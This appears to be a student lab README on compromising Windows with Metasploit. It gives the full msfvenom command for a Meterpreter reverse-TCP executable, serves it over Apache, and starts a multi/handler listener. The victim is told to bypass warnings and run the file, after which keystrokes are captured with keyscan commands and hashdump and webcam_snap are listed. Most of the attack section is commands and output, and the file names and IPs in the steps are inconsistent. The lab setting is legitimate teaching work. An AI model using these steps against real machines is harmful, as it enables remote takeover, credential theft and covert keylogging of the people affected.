# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit


# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:

<img width="635" height="335" alt="image" src="https://github.com/user-attachments/assets/31af857d-1157-48e7-83d2-e81fc94172fd" />

Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > ak.exe```

### Output:

<img width="716" height="131" alt="image" src="https://github.com/user-attachments/assets/e1c57068-6ae6-46a1-9fbd-0d019e6043c5" />


copy the ak.exe into the apache ```/var/www/html ```folder

<img width="275" height="72" alt="image" src="https://github.com/user-attachments/assets/513f0c8c-0bad-4013-bb2f-05f09ab3f92f" />



Start apache server ```sudo systemctl apache2 start``` 

Check the status of apache2 ```sudo apache2 status```

<img width="762" height="452" alt="image" src="https://github.com/user-attachments/assets/9dab46d0-20ee-4198-aa1e-db6a5671a4b7" />

Invoke msfconsole:

<img width="556" height="366" alt="image" src="https://github.com/user-attachments/assets/27d5a68d-3e03-45e1-8cf4-94bcad43f444" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

<img width="742" height="495" alt="image" src="https://github.com/user-attachments/assets/06c2a653-c8a9-4d22-90c3-94ac46b4a2ab" />


Starting a command and control Server ```use multi/handler``` 
```set PAYLOAD windows/meterpreter/reverse_tcp``` 
```set LHOST 0.0.0.0```
```exploit```

### Output 

<img width="601" height="176" alt="image" src="https://github.com/user-attachments/assets/b60a2aa9-1e43-4308-a570-2705b6806f67" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.56.101/ak.exe``` The file "ak.exe" downloads.

<img width="957" height="602" alt="image" src="https://github.com/user-attachments/assets/35707247-19fe-4bd9-9245-6484e9ac838e" />

Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

<img width="637" height="499" alt="image" src="https://github.com/user-attachments/assets/4047c3d8-6d2a-43b5-848d-e60955b18a83" />


The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name

<img width="388" height="59" alt="image" src="https://github.com/user-attachments/assets/5c539cbd-4376-4e73-9f45-0ebe51afc4fb" />

<img width="1167" height="874" alt="image" src="https://github.com/user-attachments/assets/01ebaf58-5b28-4e7e-83d5-86394b098770" />


keyscan_dump	Shows the keystrokes captured so far

<img width="576" height="223" alt="image" src="https://github.com/user-attachments/assets/a9cef6ad-4c30-4c8f-9ef7-d2467f501492" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

